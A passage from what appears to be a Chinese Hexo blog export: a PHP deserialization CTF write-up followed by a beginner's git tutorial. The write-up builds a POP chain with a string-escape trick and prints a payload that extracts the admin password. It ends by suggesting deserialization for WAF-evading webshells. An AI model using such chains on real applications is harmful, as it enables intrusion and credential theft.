invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从lib.php中可以看到反序列化可控点在nickname,但只是部分可控，由于safe安全waf的替换，很容易想起0CTF-2016-piapiapia题目的反序列化逃逸，触发点应该在update函数中，我们需要通过反序列化逃逸来进行触发pop利用链。利用链为：</p>
<p>UpdateHelper类被反序列化完成时会触发</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>echo 是打印字符，如果我们把$this-&gt;sql 赋值为user对象，那么就可以触发user对象的__tostring</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果nickname的值赋值为Info类实例化后的对象，因为info没有update方法，所以会调用__call魔术方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果把info类实例化的对象的CtrlCase值赋值为dbCtrl类实例化的对象就可以直接调用login执行查询函数，注意 __call 函数 一般就是两个参数 第一个参数$name是调用的不存在的函数名，第二个参数$argument是不存在函数调用时传递的参数组 这里的argument[0]就是$this-&gt;age。所以把$this-&gt;age赋值为sql查询语句即可查询出admin的密码并打印出来。</p>
<p>最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;gz110351&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;user&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test_UpdateHelper</span> = <span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="variable">$test_user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test_info</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$test_dbCtrl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$test_info</span>-&gt;CtrlCase=<span class="variable">$test_dbCtrl</span>;</span><br><span class="line"><span class="variable">$test_user</span>-&gt;nickname=<span class="variable">$test_info</span>;</span><br><span class="line"><span class="variable">$test_user</span>-&gt;age = <span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line"><span class="variable">$test_UpdateHelper</span>-&gt;sql = <span class="variable">$test_user</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test_UpdateHelper</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化后的结果，要加上 “;s:8:”CtrlCase”;+payload+} 因为我们只能控制部分，而代码在序列化时就会标明有三个属性，我们也要保持三个属性，否则不能反序列化成功。另外反序列化以字节数生命和 ; } 作为终止符，所以最后加 } 来过滤掉后续生成的 s:8:”CtrlCase”; 最后根据这个payload的字符数，我们需要在nickname中插入足量的黑名单字符，把payload挤出来，使得它可以被正常发序列化触发。</p>
<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>php的反序列化最重要的还是利用链的构造，当然这也是最难的部分。<br>另外php反序列化可以写各种过狗马，大家可以自己去玩儿玩儿。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>我的git笔记</title>
    <url>//posts/%E6%88%91%E7%9A%84git%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了很多教程，发现还是很多东西记不住，如果不写写的话两天就忘了，所以记一下笔记。为了让别人有教程的感觉，对笔记进行了由浅入深的排序，可以帮你们快速入门。</p>
<h3 id="git由来"><a href="#git由来" class="headerlink" title="git由来"></a>git由来</h3><p>linux在后期的开发过程中开发人员和代码量巨大，急需版本控制工具，刚开始有公司赞助给他们用，后来他们试图破解这个工具(确实很作死)，人家不给他用了，这些linux coder一气之下用C开发了初代的git，后来火了之后又在2008年做了github网站托管全球代码，从此git走入千家万户。<br>git是分布式的，但是我们普通人用起来和集中式没有区别。所以不用管这个概念。</p>
<span id="more"></span>

<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>linux :  sudo apt-get install git<br>mac:   安装homebrew - &gt; 安装git   安装xcode - &gt; preferences-&gt;downloads-&gt;Command Line Tools-&gt;install<br>window: <a href=https://git-scm.com/downloads>官方安装程序链接，推荐安装setup版而不是portable版</a><br>安装完以后需要你进行设置标记下是谁的github ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;name or nick name&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;email@example.com&quot;</span></span><br><span class="line"><span class="comment">#git config 的 --global参数 表示此电脑所有git仓库都使用这个配置</span></span><br></pre></td></tr></table></figure>

<h3 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h3><p>版本库就是一个小小的仓库，这个仓库由git管理，里面任何东西的变动它都知道，在电脑上它就是一个文件夹。<br>我们来创建一个仓库（文件）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> testforgit</span><br><span class="line"><span class="built_in">cd</span> testforgit</span><br><span class="line">git init </span><br><span class="line"><span class="comment">#上面三步我们创建了testforgit文件夹，然后初始化它为仓库交由git管理</span></span><br><span class="line"><span class="comment">#我们可以 ls -la 看下当前目录下有一个.git文件 这个文件就是用来跟踪记录这个仓库的。</span></span><br><span class="line"><span class="comment">#我们也可以初始化一个非空的仓库</span></span><br><span class="line"><span class="comment">#注意：git只能管控文本文档，所以图片，word等二进制文件他只能管控记录大小的更改，无法知道图片文件中的具体哪行被更改了。</span></span><br><span class="line"><span class="comment">#注意：初始化完成后会生成.git文件夹，我们最好不要手动去修改里面的东西，这就像是小偷一样，不跟管理员说搞走一个，git管理员可能自己混乱，仓库也被破坏了。</span></span><br></pre></td></tr></table></figure>
<p>初始完以后我们需要尝试写一个文件，比如readme.txt 写完放入git管控的目录下，这样git才能找到它，然后我们两步提交此文件到服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt</span><br><span class="line">$ git commit -m <span class="string">&quot;add 3 files.&quot;</span></span><br><span class="line"><span class="comment"># -m 参数是说明的意思，强烈建议每个commit写说明</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为什么需要两步？因为这样你可以add多个文件，然后一起commit到服务器,其中git add是提交到暂存区，gitcommit把暂存区的所有文件一起提交</span></span><br><span class="line">$ git add file1.txt </span><br><span class="line">$ git add file2.txt file3.txt</span><br><span class="line">$ git commit -m <span class="string">&quot;add 3 files.&quot;</span></span><br><span class="line"><span class="comment">#文件夹就是工作区，而 add 是提交文件到暂存区，这个概念很重要。一定要记住啊哦！</span></span><br><span class="line"><span class="comment">#如果你有一个文件readme.txt修改一次 git add了 然后它就进入了暂存区，此时本地再次修改readme.txt 再次git add，此时两次修改就被git合并存在暂存区，此时commit的就是最新的修改了！</span></span><br><span class="line"><span class="comment">#所以切记，commit只能提交存储在暂存区的文件</span></span><br></pre></td></tr></table></figure>

<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><h5 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h5><p>我们修改readme文件，然后通过以下命令来查看区别：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line"><span class="comment">#会显示那些代码被修改了，我们画个垃圾草图</span></span><br><span class="line">	          |  -&gt; untracked files     <span class="comment">#从没有git add过的文件，即不被git追踪的文件</span></span><br><span class="line">文件status分为 | -&gt; 红色 modify           <span class="comment">#修改过，但是没有add</span></span><br><span class="line">              |  -&gt; 绿色 modify          <span class="comment">#修改过 git add完了 但是还没有 commit</span></span><br><span class="line"><span class="comment">#如果当前没有任何改动，则会显示：</span></span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line"></span><br><span class="line">$ git diff readme.txt</span><br><span class="line"><span class="comment">#查看readme.txt和文件服务器上的版本有什么区别，可以清楚的知道改了哪些内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后你就可以继续提交了</span></span><br><span class="line">$ git add</span><br><span class="line">$ git commit -m</span><br></pre></td></tr></table></figure>

<h5 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h5><p>修改完文件后我们后悔了，或者说我们修改完的代码崩溃了 调不过来了，我们想回退到以前能正常运行的版本。好，这在git是非常方便的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#我们首先看下现在的reamde文件内容</span></span><br><span class="line">$ <span class="built_in">cat</span> readme.txt</span><br><span class="line">t is a version control system</span><br><span class="line">add2</span><br><span class="line">add3</span><br><span class="line"></span><br><span class="line"><span class="comment">#用git log 查看我们一共提交了多少个版本</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit 97f63044c14952fc5d13a08a8448aded163de489 (HEAD -&gt; master)</span><br><span class="line">Author: geeeez &lt;gz54321.a@gmail.com&gt;</span><br><span class="line">Date:   Tue Nov 5 11:07:24 2019 +0800</span><br><span class="line"></span><br><span class="line">    add3</span><br><span class="line"></span><br><span class="line">commit 4aae9f796a8440a0a6eb882ed99596a5fb1b5a40</span><br><span class="line">Author: geeeez &lt;gz54321.a@gmail.com&gt;</span><br><span class="line">Date:   Tue Nov 5 11:06:58 2019 +0800</span><br><span class="line"></span><br><span class="line">    add2</span><br><span class="line"></span><br><span class="line">commit cedeb93177ea09827758cdf1491a7f009ac4ef25</span><br><span class="line">Author: geeeez &lt;gz54321.a@gmail.com&gt;</span><br><span class="line">Date:   Mon Nov 4 23:05:19 2019 +0800</span><br><span class="line"></span><br><span class="line">    learn git</span><br><span class="line"></span><br><span class="line"><span class="comment">#我们一共修改了两次，分别加入了add2 和 add3 ，其中有HEAD -&gt; master表示的代表当前版本，commit后面代表的是版本唯一id，下面就是一些修改内容，如果我们想回退上次版本(add2) 只需</span></span><br><span class="line">$ git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line"><span class="comment">#回退上上次</span></span><br><span class="line">$ git reset --hard HEAD^^</span><br><span class="line"></span><br><span class="line"><span class="comment">#回退上一百次呢？难道要一直写^?当然不是，这不是git的哲学。我们可以~加次数</span></span><br><span class="line">HEAD~100</span><br><span class="line"></span><br><span class="line"><span class="comment">#但是很多时候我们不会去属次数，所以还有一张方法，和docker一样 我们可以直接通过id进行回滚</span></span><br><span class="line">$ git reset --hard 1094a</span><br><span class="line"></span><br><span class="line"><span class="comment">#现在我们回退到版本id为 cedeb（不需要写全，和docker一样）</span></span><br><span class="line">$ git reset --hard cedeb</span><br><span class="line">HEAD is now at cedeb93 learn git</span><br><span class="line"></span><br><span class="line"><span class="comment">#现在再来看看readme.txt的内容吧，可以看到add2 和 add3 都消失了</span></span><br><span class="line">t is a version control system</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时我们再看git log 发现 cedeb之后的版本全部消失了，那我们后悔了不想回退了，还想找回最新的版本怎么办？</span></span><br><span class="line"><span class="comment">#这在git也是可以的，我们有个命令git reflog 记录了你的所有操作</span></span><br><span class="line">$ git reflog</span><br><span class="line">cedeb93 (HEAD -&gt; master) HEAD@&#123;0&#125;: reset: moving to cedeb</span><br><span class="line">97f6304 HEAD@&#123;1&#125;: commit: add3</span><br><span class="line">4aae9f7 HEAD@&#123;2&#125;: commit: add2</span><br><span class="line">cedeb93 (HEAD -&gt; master) HEAD@&#123;3&#125;: reset: moving to <span class="built_in">head</span>^</span><br><span class="line">d947e60 HEAD@&#123;4&#125;: commit: <span class="built_in">test</span></span><br><span class="line">cedeb93 (HEAD -&gt; master) HEAD@&#123;5&#125;: commit (initial): learn git</span><br><span class="line"></span><br><span class="line"><span class="comment">##通过上述的版本id，你可以恢复到任何你commmit过的版本。是不是很简单啊！</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h5><p>有一天你在写代码，本来没啥事，结果等你第二天起来的时候发现昨晚写的工作区代码有很多bug，bug多到懒得调试，此时你可以一行一行的查找删除修改，也可以直接回滚版本，但是你发现出问题的代码仅存在在 login.php中，于是你想有没有一种办法回滚单个文件？嘿嘿 确实有</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -- login.php</span><br><span class="line"><span class="comment">#命令git checkout -- login.php 意思就是，把login.php文件在工作区的修改全部撤销，这里有两种情况：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#一种是login.php自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</span></span><br><span class="line"><span class="comment">#一种是login.php已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#总之，就是让这个文件回到最近一次git commit或git add时的状态。</span></span><br></pre></td></tr></table></figure>

<p>上次逃过一劫，然后你就放松警惕了，某天晚上你又在login.php写了一堆漏洞，然后还git add到了暂存区，但是你还没有commit，这时候如果用上面的命令是没用的，因为上面的命令同样只能恢复到提交到暂存区的状态，于是你晚上大哭大闹，觉得自己真是stupid，不过git 可以帮你：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD &lt;file&gt;</span><br><span class="line"><span class="comment">#reset 可以回退版本 也可以把文件从暂存区回退回来，这样就没有git add了 我们又可以用 $ git checkout -- login.php 回滚到上个commit 的 login.php了 </span></span><br></pre></td></tr></table></figure>

<p>嘿嘿，晚上终于可以早点睡觉了！</p>
<h5 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h5><p>当你删除本地库的readme.txt文件时  git status 会显示和版本库的文件不一致 会显示你删除了那个文件。</p>
<p>这个时候我们可以直接删除版本库的文件 git rm readme.txt  然后再次commit    一下，这样版本库和本地库就同步了。文件就删除完成。</p>
<p>如果你是不小心删除的，那就是恢复功能了，直接用上面的git checkout – readme.txt</p>
<h3 id="git核心功能远程仓库来了"><a href="#git核心功能远程仓库来了" class="headerlink" title="git核心功能远程仓库来了"></a>git核心功能远程仓库来了</h3><p>我们掌握了git的基础命令后发现git和svn也确实没啥大区别，但是为啥那么多人用git呢？接下来就是git方便的地方了，同时通过这个也可以知道为啥github那么受欢迎。</p>
<p>git远程仓库可以搭建在任意一台电脑上，大家都以它为仓库来拉取和提交代码，但是对于小公司来说没有必要自己去搭建一个git服务器，我们只需要把github当作一个云端电脑即可。（省时省力省钱）</p>
<h5 id="免费的git仓库"><a href="#免费的git仓库" class="headerlink" title="免费的git仓库"></a>免费的git仓库</h5><p>我们只需要注册一个github就获得了一个免费的github仓库，下面我们需要配置这个仓库使得我们本地和云端github仓库安全传输代码和数据。</p>
<p>1、首先我们创建SSH key，在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;yourmail@mail.com&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>剩下的一路回车选择默认值即可，当然如果你想给你的key设置密码也可以（过程中直接输入密码），不过我这里就不设置了。</p>
<p>然后我们就创建成功了，这时候你的用户主目录下有.ssh文件夹，里面分别是id_rsa和id_rsa.pub。这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。</p>
<p>2、登录github添加公钥。登录后点击头向下拉菜单找到settings,然后点击SSH and GPG keys。然后new一个新的SSH keys：<img data-src="C:\Users\ThinkPad、\AppData\Roaming\Typora\typora-user-images\1575614058950.png" alt="1575614058950"><br>为什么GitHub需要SSH Key呢？因为GitHub需要识别出你推送的提交确实是你推送的，而不是别人冒充的，而Git支持SSH协议，所以，GitHub只要知道了你的公钥，就可以确认只有你自己才能推送。</p>
<p>当然，GitHub允许你添加多个Key。假定你有若干电脑，你一会儿在公司提交，一会儿在家里提交，只要把每台电脑的Key都添加到GitHub，就可以在每台电脑上往GitHub推送了。</p>
<p>最后友情提示，在GitHub上免费托管的Git仓库，任何人都可以看到喔（但只有你自己才能改）。所以，不要把敏感信息放进去。</p>
<p>如果你不想让别人看到Git库，有两个办法，一个是交点保护费，让GitHub把公开的仓库变成私有的，这样别人就看不见了（不可读更不可写）。另一个办法是自己动手，搭一个Git服务器，因为是你自己的Git服务器，所以别人也是看不见的。这个方法我们后面会讲到的，相当简单，公司内部开发必备。</p>
<p>确保你拥有一个GitHub账号后，我们就即将开始远程仓库的学习。</p>
<h5 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h5><p>现在你需要登录自己的github在右上角找到“Create a new repo“ 创建一个仓库，创建完成后复制仓库的地址,回到本地的lear-git文件夹(就是你本地仓库的文件夹)，把这两个仓库关联并把本地的文件push上去：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关联两个仓库</span></span><br><span class="line">$ git remote add origin git@github.com:aeexxxz/git_cacatest.git </span><br><span class="line"><span class="comment"># 将本地文件push到远程仓库</span></span><br><span class="line">$ git push -u origin <span class="keyword">master</span></span><br><span class="line"><span class="title"># 把本地仓库的内容推到远程用git</span> push命令 实际上是把<span class="literal">master</span>分支推送到了远程</span><br><span class="line"><span class="comment"># 第一次推送时记得加上 -u 这样 git不仅会推送master到远程，还会把本地master分支和远程master分支关联起来。这样以后推送的时候就可以简化命令了。</span></span><br></pre></td></tr></table></figure>

<h5 id="从远程库克隆"><a href="#从远程库克隆" class="headerlink" title="从远程库克隆"></a>从远程库克隆</h5><p>生活中大多数情况是我们从零开始就已经准备使用github仓库，这时候我们肯定先创建远程仓库，然后拉取到本地，而不是从本地仓库再上传到远程仓库。</p>
<p>创建的github仓库的步骤和上面是一样的，我们最后仅仅需要找个合适的地方：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> 地址</span><br></pre></td></tr></table></figure>
<p>如果有多个人协作开发，那么每个人各自从远程克隆一份就可以了。</p>
<p>此外我们还发现了git也支持https 但是https速度慢，而且必须要每次推送输入口令，这种就很麻烦，除非再公司内部只开放http的情况下使用，其他情况下我们更多的用 ssh</p>
<h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><p>为什么会有分支？</p>
<p>我们上线了一个版本，然后我们现在要开发下一个版本，这时候我们创建一个分支进行开发，然后忽然客户说上线的环境有bug，那我们可以在上线版本上再搞一个分支出来去修复bug，这样互不耽误，改bug、开放新版本、添加新需求可以同步进行，最后上线的时候再根据需要统一合并。</p>
<p>为什么git创建、删除、切换分支都能在一秒内完成？</p>
<p>因为git的分支是通过改变指针的指向来完成，无论你的分支有多少文件，对git来说，它只是把指向其他分支的指针重新指向master分支。</p>
<h5 id="创建和合并分支"><a href="#创建和合并分支" class="headerlink" title="创建和合并分支"></a>创建和合并分支</h5><p>git里主分支是master，head指向master,切换分支时head指向对应分支，我们的工作分支就是head所指向的分支。</p>
<p>创建分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev <span class="comment">#创建并切换到dev分支,功能等同于下面两条命令</span></span><br><span class="line">$ git branch dev <span class="comment">#创建dev</span></span><br><span class="line">$ git checkout dev <span class="comment">#切换到dev分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时为了更好记忆新版git添加了switch命令进行切换</span></span><br><span class="line">git switch -c name <span class="comment">#创建并切换到name分支</span></span><br><span class="line">$ git switch &lt;name&gt; <span class="comment">#切换分支</span></span><br></pre></td></tr></table></figure>
<p>查看当前分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br></pre></td></tr></table></figure>
<p>合并分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git merge 分支名称</span><br></pre></td></tr></table></figure>
<p>删除废弃的分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git branch -d dev</span><br></pre></td></tr></table></figure>

<h5 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h5><p>如果两个文件名相同内容不同且都在当前节点提交，就会变成这样：<br><img data-src="C:\Users\ThinkPad、\AppData\Roaming\Typora\typora-user-images\1575622688980.png" alt="1575622688980"></p>
<p>这时候我们进行 git merge+分支名称 会提示冲突因为相同文件有不同的内容，这个时候需要我们手动修改对应文件 并再次 git add git commit 然后才可以合并成功</p>
<h5 id="分支管理-1"><a href="#分支管理-1" class="headerlink" title="分支管理"></a>分支管理</h5><p>git merge  命令 默认使用的是fast-forward模式，此模式下删掉分支后，会丢掉分支的信息。有时候我们需要合并后保留分支中的信息方便我们做代码变动的审查，于是就有了强制关闭Fast forward模式的合并</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> checkout -b dev</span><br><span class="line"><span class="variable">$git</span> add readme.txt</span><br><span class="line"><span class="variable">$git</span> commit -m <span class="string">&quot;modify readme.txt&quot;</span></span><br><span class="line"><span class="variable">$git</span> checkout master</span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> merge --no-ff -m <span class="string">&quot;merge with no-ff&quot;</span> dev</span><br><span class="line"><span class="variable">$git</span> <span class="built_in">log</span> --graph --pretty=oneline --abbrev-commit        <span class="comment">#查看分支信息</span></span><br><span class="line"><span class="comment">#这次合并后创建了一个新的commit，这种合并后使用 git log查看分支历史可以看到分支的信息</span></span><br><span class="line"><span class="comment">#合并分支时，加上--no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而fast forward合并就看不出来曾经做过合并。</span></span><br></pre></td></tr></table></figure>

<p>我们在实际开发中应该这样合理分配利用分支。<br>1、首先master分支是非常稳定的，仅仅用来发布新版本。<br>2、干活儿在dev分支上，等测试没问题了再合并到master分支。<br>3、每个人都有自己的分支，是不是的往dev分支上合并就可以了。</p>
<p>借用廖老师的一张图，真正的开发应该是这样</p>
<p><img data-src="https://www.liaoxuefeng.com/files/attachments/919023260793600/0" alt="git-br-policy"></p>
<h5 id="BUG分支"><a href="#BUG分支" class="headerlink" title="BUG分支"></a>BUG分支</h5><p>bug永远存在，无论你的组大佬有多少，bug永远存在。git分支让bug修复更方便。</p>
<p>我是bob现在我正在bob分支上开发，但是领导突然通知有bug马上让我去修复，但是我的本地的工作还没有搞完，只写了一半，也无法提交（commit）。所以我只能先把当前工作区存储起来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> status    <span class="comment">#查看当前工作区是否有未提交的，如果没有就不用保存当前工作区了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切记没有进入git版本控制中的文件是不能被git stash 存起来的 所以有些后来添加的文件，没有来得及add到git版本控制 就不会被git stash存储起来。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> stash        <span class="comment">#git stash 保存当前工作区和暂存区进度，回退到上一个 git commit 之后的状态</span></span><br><span class="line"><span class="variable">$git</span> stash list   <span class="comment"># 查看存储过的工作区列表</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里会有人问，为什么我创建的比如3.txt没有加入版本控制器，它就无法被保存，那此时的git stash并不是完全保存了我现在的工作区，他有什么作用？</p>
